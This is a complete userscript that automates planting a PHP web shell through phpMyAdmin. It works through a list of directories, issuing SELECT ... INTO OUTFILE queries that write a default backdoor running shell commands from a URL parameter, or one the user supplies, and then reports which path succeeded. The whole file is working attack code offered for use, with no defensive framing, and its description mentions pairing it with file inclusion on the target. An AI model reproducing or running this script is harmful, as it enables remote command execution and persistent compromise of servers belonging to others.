// ==UserScript==
// @name         auto-backdoor-phpmyadmin
// @namespace    https://www.phpmyadmin.net/
// @version      1.4
// @description  Auto-upload backdoor using phpmyadmin, this script is only useful when you've access to phpmyadmin and 'FILE' privilege and can do LFI in another place of the target, goto phpmyadmin/sql.php and it starts automatically
// @author       Pablo Skubert
// @include      https://*/phpmyadmin*/sql.php*
// @include      http://*/phpmyadmin*/sql.php*
// @grant        none
// ==/UserScript==

/*
Tested on phpmyadmin 2.6.1 and 2.11.2
*/
(function () {
   'use strict';
   var it = localStorage.getItem('PATH_WORDLIST');
   var TEST_DIRS = (it !== null)
      ? it.split(',')
      : [];

   const isFirstExecution = localStorage.getItem('FE') === null;
   let t_times = 0, customBkd = '';
   if (isFirstExecution) {

      localStorage.setItem('TESTED_TIMES', 0);
      localStorage.setItem('BACKDOOR_NAME', prompt('Enter backdoor name, ex: ping_test.php'));
      localStorage.setItem('FE', false);
      var wordlistPath = prompt('Enter a comma-separated list of directories to test.');
      if (wordlistPath === null || wordlistPath === "") {
         alert('You need to put a comma-separated list of direcotires. Try again.');
         return;
      }

      wordlistPath = wordlistPath.replace(/(\r\n|\n|\r)/gm, "");
      localStorage.setItem('PATH_WORDLIST', wordlistPath);
      TEST_DIRS = wordlistPath.split(',');
      customBkd = prompt('Put your own custom backdoor or leave empty to use default, the backdoor needs  to be urlencoded');
      localStorage.setItem('CUSTOM_BKD', customBkd);

   } else {
      t_times = parseInt(localStorage.getItem('TESTED_TIMES'));
      customBkd = localStorage.getItem('CUSTOM_BKD');

      if (t_times >= TEST_DIRS.length) {
         alert('Finished!! If u wanna try again, delete all local storage records.');
         return;
      }

      const lDir = localStorage.getItem('LAST_TRY').replaceAll('%2F', '/');
      if (t_times > 0) {
         const errLabel = document.querySelector('div.errorhead').innerHTML;
         if (errLabel === 'Error') {

            console.log(`\nFailed uploading to ${lDir} test nº ${t_times+1}`);
         } else {

            alert(`Success!! backdoor uploaded to ${lDir}`);
            return;
         }
      }
   };

   const PHP_BACKDOOR = (customBkd !== '')
      ? `SELECT%20%27${customBkd}%27%20INTO%20OUTFILE%20%27DIR%27`
      : "SELECT%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27DIR%27";

   const dirToTest = TEST_DIRS[t_times];
   var dirString = dirToTest.replaceAll('/', '%2F');
   dirString = (dirString.endsWith('F'))
      ? dirString : dirString.concat('%2F');
   dirString = dirString.concat(localStorage.getItem('BACKDOOR_NAME'));

   localStorage.setItem('TESTED_TIMES', (t_times+1));
   localStorage.setItem('LAST_TRY', dirString);
   location.search = `db=mysql&sql_query=${PHP_BACKDOOR.replace('DIR', dirString).replaceAll(' ', '+')}`;
})();